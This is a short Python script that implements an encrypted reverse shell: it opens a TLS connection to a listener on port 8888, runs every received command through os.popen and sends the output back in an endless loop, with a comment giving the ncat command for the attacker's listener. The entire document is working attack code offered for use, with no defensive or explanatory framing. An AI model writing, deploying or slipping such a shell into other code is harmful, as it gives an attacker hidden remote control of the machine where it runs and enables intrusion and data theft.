#!/usr/bin/env python

import os,socket,ssl


host = "localhost"
port = 8888

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#wrap the socket in ssl
#read more about the wrap_socket function and its ssl versions available.
wsocket = ssl.wrap_socket(sock,ssl_version=ssl.PROTOCOL_TLSv1)


wsocket.connect((host,port))


while True:
    command = wsocket.recv(1000)
    result = os.popen(command).read()
    wsocket.send(result)


#can use netcat to create ssl connection listener
#ncat --ssl -vlp 8888